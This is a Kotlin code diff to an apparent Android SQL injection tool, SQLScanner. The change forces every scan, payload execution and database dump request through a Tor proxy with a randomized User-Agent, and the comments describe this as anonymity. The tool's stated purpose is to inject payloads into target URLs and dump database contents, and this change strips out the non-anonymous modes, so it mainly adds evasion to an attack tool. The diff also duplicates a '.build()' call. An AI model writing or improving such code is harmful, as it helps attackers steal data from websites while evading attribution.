@@ -55,24 +55,21 @@ class SQLScanner {
     )
     
     suspend fun scanURL(url: String, mode: ScanMode): ScanResult = withContext(Dispatchers.IO) {
-        Log.d(TAG, "Starting scan for URL: $url with mode: $mode")
+        Log.d(TAG, "🔒 FAIL-CLOSED TOR MODE: Starting scan for URL: $url")
+        Log.w(TAG, "⚠️ ALL traffic will route through Tor SOCKS proxy (127.0.0.1:9050)")
+        Log.w(TAG, "⚠️ Scan will FAIL if Tor is not running - this is intentional for security")
         
         // Validate URL format
         if (!url.startsWith("http://") && !url.startsWith("https://")) {
             throw IllegalArgumentException("URL must start with http:// or https://")
         }
         
-        val client = when (mode) {
-            ScanMode.STANDARD -> standardClient
-            ScanMode.TOR, ScanMode.TOR_PROXY_FORCED -> {
-                Log.d(TAG, "Using Tor SOCKS proxy at 127.0.0.1:9050")
-                if (mode == ScanMode.TOR_PROXY_FORCED) {
-                    Log.w(TAG, "TOR_PROXY_FORCED mode: All traffic MUST go through Tor proxy. Will fail if Tor is not running.")
-                }
-                torClient
-            }
-            ScanMode.STEALTH -> createStealthClient()
-        }
+        // ALWAYS use Tor client - no exceptions (fail-closed architecture)
+        val client = torClient
+        
+        // Randomize User-Agent for device fingerprint protection
+        val randomUserAgent = stealthUserAgents.random()
+        Log.d(TAG, "Using randomized User-Agent for fingerprint protection")
         
         var vulnerabilityFound = false
         var detectedDatabase = DatabaseType.UNKNOWN
@@ -94,11 +91,8 @@ class SQLScanner {
                 
                 val request = Request.Builder()
                     .url(testUrl)
-                    .apply {
-                        if (mode == ScanMode.STEALTH) {
-                            header("User-Agent", stealthUserAgents.random())
-                        }
-                    }
+                    .header("User-Agent", randomUserAgent) // Always randomize for fingerprint protection
+                    .build()
                     .build()
                 
                 val response = client.newCall(request).execute()
@@ -222,16 +216,6 @@ class SQLScanner {
             responseDetails = responseDetails,
             vulnerablePayloads = vulnerablePayloads
         )
-    }
-    
-    private fun createStealthClient(): OkHttpClient {
-        return OkHttpClient.Builder()
-            .connectTimeout(CONNECT_TIMEOUT_SECONDS, TimeUnit.SECONDS)
-            .readTimeout(READ_TIMEOUT_SECONDS, TimeUnit.SECONDS)
-            .writeTimeout(CONNECT_TIMEOUT_SECONDS, TimeUnit.SECONDS)
-            .followRedirects(true)
-            .followSslRedirects(true)
-            .build()
     }
     
     private fun buildTestUrl(baseUrl: String, payload: String): String {
@@ -427,24 +411,19 @@ class SQLScanner {
     
     /**
      * Execute a specific SQL injection payload and return the response
+     * ALWAYS routes through Tor for anonymity
      */
     suspend fun executePayload(url: String, payload: String, mode: ScanMode): String = withContext(Dispatchers.IO) {
-        Log.d(TAG, "Executing payload: ${payload.take(50)}... on URL: $url")
+        Log.d(TAG, "🔒 Executing payload through Tor: ${payload.take(50)}... on URL: $url")
         
-        val client = when (mode) {
-            ScanMode.STANDARD -> standardClient
-            ScanMode.TOR, ScanMode.TOR_PROXY_FORCED -> torClient
-            ScanMode.STEALTH -> createStealthClient()
-        }
+        // ALWAYS use Tor client - fail-closed architecture
+        val client = torClient
+        val randomUserAgent = stealthUserAgents.random()
         
         val testUrl = buildTestUrl(url, payload)
         val request = Request.Builder()
             .url(testUrl)
-            .apply {
-                if (mode == ScanMode.STEALTH) {
-                    header("User-Agent", stealthUserAgents.random())
-                }
-            }
+            .header("User-Agent", randomUserAgent)
             .build()
         
         val response = client.newCall(request).execute()
@@ -462,15 +441,14 @@ class SQLScanner {
     
     /**
      * Attempt to dump database contents using various SQL injection techniques
+     * ALWAYS routes through Tor for anonymity
      */
     suspend fun dumpDatabase(url: String, dbType: DatabaseType, mode: ScanMode): Map<String, List<String>> = withContext(Dispatchers.IO) {
-        Log.d(TAG, "Starting database dump for URL: $url, DB Type: $dbType")
+        Log.d(TAG, "🔒 Starting database dump through Tor for URL: $url, DB Type: $dbType")
         
-        val client = when (mode) {
-            ScanMode.STANDARD -> standardClient
-            ScanMode.TOR, ScanMode.TOR_PROXY_FORCED -> torClient
-            ScanMode.STEALTH -> createStealthClient()
-        }
+        // ALWAYS use Tor client - fail-closed architecture
+        val client = torClient
+        val randomUserAgent = stealthUserAgents.random()
         
         val dumpedData = mutableMapOf<String, List<String>>()
         
@@ -511,11 +489,7 @@ class SQLScanner {
                 val testUrl = buildTestUrl(url, payload)
                 val request = Request.Builder()
                     .url(testUrl)
-                    .apply {
-                        if (mode == ScanMode.STEALTH) {
-                            header("User-Agent", stealthUserAgents.random())
-                        }
-                    }
+                    .header("User-Agent", randomUserAgent) // Always randomize for fingerprint protection
                     .build()
                 
                 val response = client.newCall(request).execute()
